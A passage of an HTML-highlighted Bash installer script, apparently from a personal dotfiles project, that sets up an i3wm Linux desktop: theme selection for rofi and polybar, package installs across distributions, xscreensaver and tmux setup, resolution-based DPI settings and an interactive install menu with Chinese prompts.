水平底部布局，圆角按钮&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2,style-8 垂直靠右布局,背景透明，圆角按钮&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-2,style-10 水平居中布局,背景透明，圆角按钮&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-3,style-1 水平居中布局,圆角按钮&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-4,style-1 水平全屏布局,背景透明，圆角按钮&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-4,style-3 水平居中显示,背景透明，圆角按钮&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-4,style-4 水平全屏布局,背景蓝粉色渐变&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-4,style-5 水平全屏布局,背景蓝黑色渐变&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-5,style-4 上下布局,顶部有空白显示图片区域&quot;</span><br>        menu_iteml <span class="hljs-string">&quot;type-6,style-4 上下布局,顶部有空白显示图片区域&quot;</span><br><br>        selected_theme=<span class="hljs-string">&quot;&quot;</span><br>        common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/powermenu/<span class="hljs-variable">$&#123;theme_name&#125;</span>/&quot;</span> <span class="hljs-string">&quot;style&quot;</span> || <span class="hljs-built_in">return</span> 1<br>        style_name=`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> | sed <span class="hljs-string">&#x27;s/.rasi//g&#x27;</span>`<br>        [[ <span class="hljs-string">&quot;<span class="hljs-variable">$style_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; style_name=<span class="hljs-string">&quot;style-1&quot;</span><br><br>        <span class="hljs-comment">#sed -i &quot;s|^bindsym \$mod+shift+l exec.*|bindsym \$mod+shift+l exec --no-startup-id  ~/.config/rofi/powermenu/$&#123;theme_name&#125;/powermenu.sh|g&quot; ~/.config/i3/config ~/.config/i3/config.d/*</span><br>        sed -E -i <span class="hljs-string">&quot;s|=&#x27;style-[0-9]+&#x27;|=&#x27;<span class="hljs-variable">$&#123;style_name&#125;</span>&#x27;|g&quot;</span> ~/.config/rofi/powermenu/<span class="hljs-variable">$&#123;theme_name&#125;</span>/powermenu.sh<br>        <span class="hljs-built_in">cd</span> ~/.config/rofi/scripts &amp;&amp; <span class="hljs-built_in">ln</span> -sf ../powermenu/<span class="hljs-variable">$&#123;theme_name&#125;</span>/powermenu.sh powermenu<br>        menu_iteml <span class="hljs-string">&quot;切换 powermenu 为 <span class="hljs-variable">$theme_name</span> 主题, 应用 <span class="hljs-variable">$&#123;style_name&#125;</span> 类型&quot;</span><br>    <span class="hljs-keyword">fi</span><br>    i3-msg restart<br>    menu_tail<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">select_polybar_themes</span></span>() &#123;<br>    prompt <span class="hljs-string">&quot;开始设置 polybar 主题&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    tmp_path=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.config/polybar_themes&quot;</span><br>    [[ ! -r <span class="hljs-variable">$tmp_path</span> ]] &amp;&amp; <span class="hljs-built_in">return</span> 1<br>    prompt <span class="hljs-string">&quot;更新 polybar 主题到最新版&quot;</span> &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; git pull &amp;&amp; <span class="hljs-built_in">cd</span> -<br>    menu_head <span class="hljs-string">&quot;选择 polybar_themes 主题(默认zioer)&quot;</span><br>    selected_theme=<span class="hljs-string">&quot;&quot;</span><br>    common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/themes&quot;</span><br>    theme_name=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$theme_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; theme_name=<span class="hljs-string">&quot;zioer&quot;</span><br>    menu_head <span class="hljs-string">&quot;请为 <span class="hljs-variable">$theme_name</span> 主题选择 prompt样式(默认triangle)&quot;</span><br>    style_list=<span class="hljs-string">&quot;`grep &#x27;^sep_.*_left = &#x27; ~/.config/polybar_themes/template/icons.ini | awk -F_ &#x27;&#123; a[<span class="hljs-variable">$2</span>]++&#125;END&#123;for(i in a)&#123; printf(&quot;</span>%s\n<span class="hljs-string">&quot;,i) &#125;&#125;&#x27;`&quot;</span><br>    selected_theme=<span class="hljs-string">&quot;&quot;</span><br>    common_list_select <span class="hljs-string">&quot;<span class="hljs-variable">$style_list</span>&quot;</span> <span class="hljs-string">&quot;prompt样式&quot;</span><br>    prompt_style=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;selected_theme&#125;</span>&quot;</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$prompt_style</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; prompt_style=<span class="hljs-string">&quot;triangle&quot;</span><br>    menu_head <span class="hljs-string">&quot;请为 <span class="hljs-variable">$theme_name</span> 主题选择 颜色搭配方案(默认zioer)&quot;</span><br>    menu_iteml <span class="hljs-string">&quot;zioer&quot;</span> <span class="hljs-string">&quot;zioer颜色方案默认使用 ~/.Xresources 颜色方案&quot;</span><br>    menu_tail<br>    selected_theme=<span class="hljs-string">&quot;&quot;</span><br>    common_select <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>/colors&quot;</span><br>    color_name=<span class="hljs-string">&quot;`echo <span class="hljs-variable">$&#123;selected_theme&#125;</span> | sed &#x27;s/.ini$//g&#x27;`&quot;</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$color_name</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; color_name=<span class="hljs-string">&quot;zioer&quot;</span><br>    <br>    sed -i <span class="hljs-string">&quot;s|^exec.*config/polybar_themes.*|exec_always --no-startup-id  ~/.config/polybar_themes/launch.sh <span class="hljs-variable">$&#123;theme_name&#125;</span> <span class="hljs-variable">$&#123;prompt_style&#125;</span> <span class="hljs-variable">$&#123;color_name&#125;</span> &gt; /dev/null 2&gt;\&amp;1|g&quot;</span> ~/.config/i3/config ~/.config/i3/config.d/*<br>    menu_iteml <span class="hljs-string">&quot;已切换polybar_themes 为 <span class="hljs-variable">$&#123;theme_name&#125;</span> 主题, <span class="hljs-variable">$&#123;prompt_style&#125;</span> 样式, <span class="hljs-variable">$&#123;color_name&#125;</span> 颜色搭配&quot;</span><br>    i3-msg restart<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_clipmenu_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y xsel libxfixes-dev<br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y xsel libXfixes-devel<br>    <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y xsel libXfixes-devel<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed xsel libxfixes<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_clipmenu</span></span>() &#123;<br>    prompt <span class="hljs-string">&quot;安装 clipmenu 剪切板菜单&quot;</span><br>    <span class="hljs-comment"># 依赖安装</span><br>    install_clipmenu_deps<br>    tmp_path=<span class="hljs-string">&quot;<span class="hljs-variable">$tmp_dir</span>/clipnotify&quot;</span><br>    [[ -d <span class="hljs-variable">$tmp_path</span> ]] || git <span class="hljs-built_in">clone</span> https://github.com/cdown/clipnotify.git <span class="hljs-variable">$tmp_path</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; make &amp;&amp; sudo PREFIX=/usr make install<br>    tmp_path=<span class="hljs-string">&quot;<span class="hljs-variable">$tmp_dir</span>/clipmenu&quot;</span><br>    [[ -r <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> https://github.com/cdown/clipmenu <span class="hljs-variable">$tmp_path</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; sudo make install<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_xscreensaver_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y perl intltool libxext-dev libxi-dev libxt-dev libxft-dev libxinerama-dev \<br>                        libxrandr-dev libxxf86vm-dev libgl-dev libgl1-mesa-dev libglu1-mesa-dev libgle3-dev libgtk2.0-dev  libgtk-3-dev libgdk-pixbuf-xlib-2.0-dev \<br>                        libxml2 libxml2-dev libpam0g libpam0g-dev dbus libsystemd-dev <br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y perl intltool libXext-devel libXi-devel libXft-devel libXinerama-devel \<br>                        libXrandr-devel libXxf86vm-devel mesa-libGL-devel gtk2-devel gdk-pixbuf2-devel gdk-pixbuf2-xlib-devel \<br>                        libxml2-devel pam pam-devel dbus systemd-devel<br>    <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y perl intltool libXext-devel libXi-devel libXft-devel libXinerama-devel \<br>                        libXrandr-devel libXxf86vm-devel Mesa-libGL-devel libgtk-2_0-0 gtk2-devel gdk-pixbuf-devel gdk-pixbuf-xlib-devel \<br>                        libxml2-devel pam pam-devel dbus-1 systemd-devel<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed perl intltool libxext libxi libxft libxinerama \<br>                        libxrandr libxxf86vm mesa glu gtk2 gdk-pixbuf2 gdk-pixbuf-xlib libxml2 pam dbus systemd intltool<br>    install_urxvt_ext<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">compile_xscreensaver</span></span>() &#123;<br>    str_version=<span class="hljs-string">&quot;6.06&quot;</span><br>    url=<span class="hljs-string">&quot;https://www.jwz.org/xscreensaver/xscreensaver-<span class="hljs-variable">$&#123;str_version&#125;</span>.tar.gz&quot;</span><br>    filename=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;tmp_dir&#125;</span>/xscreensaver-<span class="hljs-variable">$&#123;str_version&#125;</span>.tar.gz&quot;</span><br>    [[ ! -f <span class="hljs-variable">$&#123;filename&#125;</span> ]] &amp;&amp; curl -L -o <span class="hljs-variable">$&#123;filename&#125;</span> <span class="hljs-variable">$&#123;url&#125;</span><br>    tmp_path=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;tmp_dir&#125;</span>/xscreensaver-<span class="hljs-variable">$&#123;str_version&#125;</span>&quot;</span><br>    [[ ! -r <span class="hljs-variable">$&#123;tmp_path&#125;</span> ]] &amp;&amp; tar axvf <span class="hljs-variable">$&#123;filename&#125;</span> -C <span class="hljs-variable">$&#123;tmp_dir&#125;</span><br>    install_xscreensaver_deps<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; ./configure --prefix=/usr &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>) &amp;&amp; sudo make install<br>    [[ <span class="hljs-string">&quot;$?&quot;</span> != <span class="hljs-string">&quot;0&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败!找到错误原因后重新尝试!&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 2<br>    [[ ! -x /usr/bin/xscreensaver ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败!没找到 xscreensaver 命令&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 3<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;恭喜您! xscreensaver 安装成功!&quot;</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">config_resolution</span></span>() &#123;<br>    <span class="hljs-comment"># 自适应分辨率 1080p/2k/4k</span><br>    <span class="hljs-comment"># 获取屏幕分辨率</span><br>    resolution=$(xrandr | grep <span class="hljs-string">&#x27; connected primary&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> | awk -F<span class="hljs-string">&#x27;[x+]&#x27;</span> <span class="hljs-string">&#x27;&#123; print $2 &#125;&#x27;</span>)<br>    <span class="hljs-comment"># 分辨率检测并设置polybar高度</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$resolution</span> -le 1080 ]] ; <span class="hljs-keyword">then</span> <span class="hljs-comment"># 老旧非高分屏幕 11英寸-13英寸</span><br>        dpi=96<br>        font_size=10<br>    <span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$resolution</span> -le 1440 ]]; <span class="hljs-keyword">then</span><br>        dpi=140<br>        font_size=12<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment"># elif [[ $resolution -gt 1440 ]]; then</span><br>        dpi=196<br>        font_size=12<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;resolution: <span class="hljs-variable">$resolution</span> , dpi: <span class="hljs-variable">$dpi</span> , font_size: <span class="hljs-variable">$font_size</span>&quot;</span><br>    <span class="hljs-comment"># 修改跟分辨率相关配置</span><br>    sed -i <span class="hljs-string">&quot;s/Xft.dpi:.*/Xft.dpi: <span class="hljs-variable">$dpi</span>/g&quot;</span> ~/.Xresources<br>    sed -E -i <span class="hljs-string">&quot;s/dpi:.*;/dpi: <span class="hljs-variable">$dpi</span>;/g;s/font: \&quot;([^\&quot;]+)( [0-9]+ *)\&quot;;/font: \&quot;\1 <span class="hljs-variable">$font_size</span>\&quot;;/g&quot;</span> ~/.config/rofi/config.rasi<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">check_terminal_list</span></span>() &#123;<br>    <span class="hljs-keyword">for</span> tname <span class="hljs-keyword">in</span> x-terminal-emulator mate-terminal gnome-terminal terminator xfce4-terminal urxvt rxvt termit Eterm aterm uxterm xterm roxterm termite lxterminal terminology st qterminal lilyterm tilix terminix konsole kitty guake tilda alacritty hyper wezterm<br>    <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">command</span> -v <span class="hljs-variable">$tname</span> &gt; /dev/null 2&gt;&amp;1  &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$tname</span><br>    <span class="hljs-keyword">done</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">select_terminal</span></span>() &#123;<br>    selected_theme=<span class="hljs-string">&quot;&quot;</span><br>    prompt <span class="hljs-string">&quot;选择Terminal终端(默认`echo_greenr i3-sensible-terminal`)&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    terminal_list=`check_terminal_list`<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;当前可用终端: <span class="hljs-variable">$terminal_list</span>&quot;</span><br>    common_list_select <span class="hljs-string">&quot;<span class="hljs-variable">$terminal_list</span>&quot;</span> <span class="hljs-string">&quot;terminal&quot;</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> != <span class="hljs-string">&quot;&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>        sed -i <span class="hljs-string">&quot;s#^set \$TERMINAL .*#set \$TERMINAL <span class="hljs-variable">$selected_theme</span>#g&quot;</span> ~/.config/i3/config ~/.config/i3/config.d/*<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已经设置新的 TERMINAL 终端工具，重新加载i3wm后生效&quot;</span><br>        i3-msg restart<br>    <span class="hljs-keyword">fi</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">update_i3config</span></span>() &#123;<br>    <span class="hljs-comment"># 更新 i3config 到最新版本</span><br>    tmp_path=<span class="hljs-string">&quot;<span class="hljs-variable">$tmp_dir</span>/i3config&quot;</span><br>    install_path=<span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span><br>    curl -L -o <span class="hljs-variable">$tmp_path</span> https://raw.githubusercontent.com/switchToLinux/dotfiles/main/i3config<br>    [[ <span class="hljs-string">&quot;$?&quot;</span> == <span class="hljs-string">&quot;0&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">mv</span> <span class="hljs-variable">$&#123;install_path&#125;</span> <span class="hljs-variable">$&#123;install_path&#125;</span>.old &amp;&amp; <span class="hljs-built_in">mv</span> <span class="hljs-variable">$tmp_path</span> <span class="hljs-variable">$&#123;install_path&#125;</span><br>    <span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$&#123;install_path&#125;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;已更新 i3config 到最新版本 <span class="hljs-variable">$&#123;I3CONFIG_VERSION&#125;</span>&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">get_dm_list</span></span>() &#123;<br>    <span class="hljs-keyword">for</span> dm <span class="hljs-keyword">in</span> lightdm sddm gdm<br>    <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$dm</span><br>    <span class="hljs-keyword">done</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_xinit</span></span>() &#123;<br>    <span class="hljs-comment"># 选择DM</span><br>    selected_theme=<span class="hljs-string">&quot;&quot;</span><br>    prompt <span class="hljs-string">&quot;选择DM显示管理器(默认`echo_greenr lightdm`)&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    dm_list=<span class="hljs-string">&quot;`get_dm_list`&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;当前可用终端: <span class="hljs-variable">$dm_list</span>&quot;</span><br>    common_list_select <span class="hljs-string">&quot;<span class="hljs-variable">$dm_list</span>&quot;</span> <span class="hljs-string">&quot;显示管理器&quot;</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; selected_theme=<span class="hljs-string">&quot;lightdm&quot;</span><br><br>    <span class="hljs-comment"># 安装X窗口系统和DM</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> == <span class="hljs-string">&quot;lightdm&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y xinit lightdm lightdm-gtk-greeter<br>        <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y xinit lightdm lightdm-gtk<br>        <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y xinit lightdm lightdm-gtk-greeter<br>        <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed xorg-xinit lightdm lightdm-gtk-greeter<br>    <span class="hljs-keyword">elif</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> == <span class="hljs-string">&quot;sddm&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y xinit sddm<br>        <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y xinit sddm<br>        <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y xinit sddm<br>        <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed xorg-xinit sddm<br>    <span class="hljs-keyword">elif</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$selected_theme</span>&quot;</span> == <span class="hljs-string">&quot;gdm&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y xinit gdm3<br>        <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y xinit gdm<br>        <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y xinit gdm<br>        <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed xorg-xinit gdm<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-comment"># 自启动lightdm</span><br>    sudo systemctl <span class="hljs-built_in">enable</span> --now <span class="hljs-variable">$selected_theme</span>.service<br>    <span class="hljs-comment"># 禁止gettty服务</span><br>    sudo systemctl <span class="hljs-built_in">disable</span> getty@.service<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_tmux</span></span>() &#123;  <span class="hljs-comment"># Terminal终端会话管理工具,类似Screen</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在执行 install_tmux&quot;</span><br>    prompt <span class="hljs-string">&quot;开始安装 tmux&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-built_in">command</span> -v tmux &gt;/dev/null &amp;&amp; ! prompt <span class="hljs-string">&quot;已经安装过 tmux ，继续安装?&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-comment"># basic config with plugin</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;配置tmux&quot;</span><br>    create_symlink <span class="hljs-variable">$dotfiles_path</span>/tmux/tmux.conf ~/.tmux.conf<br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装tmux插件&quot;</span><br>    <span class="hljs-comment"># 配置 tmux</span><br>    <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y tmux<br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y tmux<br>    <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y tmux<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed tmux<br>    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.tmux/plugins/<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/.tmux/plugins/<br>    git <span class="hljs-built_in">clone</span> https://github.com/tmux-plugins/tpm.git<br>    git <span class="hljs-built_in">clone</span> https://github.com/tmux-plugins/tmux-resurrect.git<br>    git <span class="hljs-built_in">clone</span> https://github.com/tmux-plugins/tmux-continuum.git<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;成功执行 install_tmux&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">usage_shortcuts</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line_feed</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;i3wm常用快捷键列表:&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  打开 vscode : \$mod+c&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  打开 terminal : \$mod+Enter&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  打开 google-chrome :  \$mod+g&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  打开 firefox :  \$mod+b&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  隐藏/显示 顶部bar ： \$mod+ + n&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  隐藏/显示 底部bar ： \$mod+ + m&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  工作区双屏切换: \$mod+x&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  系统退出: \$mod+l&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  显示菜单: \$mod+d&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  显示窗口列表菜单: \$mod+Tab&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  切换窗口布局类型(split/stacking/tabbed): \$mod+e&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  切换垂直/水平方向布局窗口: \$mod+v&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  焦点窗口的焦点切换到父节点: \$mod+a&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  焦点窗口的焦点切换到子节点: \$mod+shift+a&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  全屏显示当前焦点窗口: \$mod+f&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  关闭焦点窗口: \$mod+q&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  移动焦点窗口: \$mod+Shift+方向键&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  暂存工作区-暂存当前窗口: \$mod+shift+minus(减号)&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  暂存工作区-显示暂存窗口: \$mod+minus (多个暂存窗口会逐个切换)&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  浮动窗口-切换焦点窗口悬浮/普通 : \$mod+shift+space&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  浮动窗口-移动浮动窗口上下左右: \$mod+Shift+方向键&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  浮动窗口Sticky-焦点窗口切换: \$mod+Shift+s&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  浮动窗口Sticky-切换为置顶悬浮小窗口: \$mod+shift+i (45 ppt 45 ppt =&gt; position 30,30 px )&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  配置变更-重新加载: \$mod+Shift+c&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  配置变更-i3wm重启: \$mod+Shift+r&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  锁屏操作-i3lock: \$mod+l&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  重启关机等电源管理操作: \$mod+Shift+l&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  开启resize模式： \$mod+r， 方向键调整，确认按Enter,取消按Esc&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  窗口间边距: 增加\$mod+Backspace ， 减小\$mod+Shift+Backspace&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  窗口外边距: 增加\$mod+= ， 减小\$mod+Shift+=&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  焦点窗口透明度修改: 增加5%\$mod+[ ，减小5%\$mod+]&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">auto_install_all</span></span>() &#123;<br>    <span class="hljs-comment"># 自动安装</span><br>    default_confirm=<span class="hljs-string">&quot;yes&quot;</span><br>    READ_TIMEOUT=5<br>    install_xinit<br>    compile_i3wm             <br>    compile_polybar          <br>    compile_picom            <br>    compile_i3lock_color     <br>    install_clipmenu         <br>    compile_rofi             <br>    compile_xscreensaver      <br>    install_urxvt_ext        <br>    install_others           <br>    install_dotfiles         <br>    select_polybar_themes    <br>    select_rofi_themes       <br>    select_xresources_themes <br>    config_resolution        <br>    install_tmux<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">show_menu_install</span></span>() &#123;<br>    menu_head <span class="hljs-string">&quot;i3config <span class="hljs-variable">$&#123;I3CONFIG_VERSION&#125;</span> 安装选项菜单&quot;</span><br>    menu_item 1 i3wm<br>    menu_item 2 polybar<br>    menu_item 3 picom<br>    menu_item 4 i3lock_color<br>    menu_item 5 tmux<br>    menu_item 6 rofi<br>    menu_item 7 xscreensaver<br>    menu_item 8 compile_mpd<br>    menu_item 9 other[feh/mpd/dunst.]<br>    menu_item 0 dotfiles<br>    menu_tail<br>    menu_item h 查看常用快捷键列表<br>    menu_item p select_polybar_themes<br>    menu_item r select_rofi_themes<br>    menu_item s select_xresources_themes<br>    menu_item t select_terminal<br>    menu_item x match_resolution<br>    menu_item y install_xinit<br>    menu_item z 自动安装<br>    menu_tail<br>    menu_item u update_i3config<br>    menu_item q 返回上级菜单<br>    menu_tail<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">start_main</span></span>() &#123; <span class="hljs-comment"># 安装菜单选择</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">do</span><br>        show_menu_install<br>        <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -r -n 1 -e  -p <span class="hljs-string">&quot;`echo_greenr 请选择:` <span class="hljs-variable">$&#123;PMT&#125;</span> &quot;</span> str_answer<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$str_answer</span>&quot;</span> <span class="hljs-keyword">in</span><br>            1) compile_i3wm             ;;<br>            2) compile_polybar          ;;<br>            3) compile_picom            ;;<br>            4) compile_i3lock_color     ;;<br>            5) install_tmux             ;;<br>            6) compile_rofi             ;;<br>            7) compile_xscreensaver     ;;<br>            8) compile_mpd              ;;<br>            9) install_others           ;;<br>            0) install_dotfiles         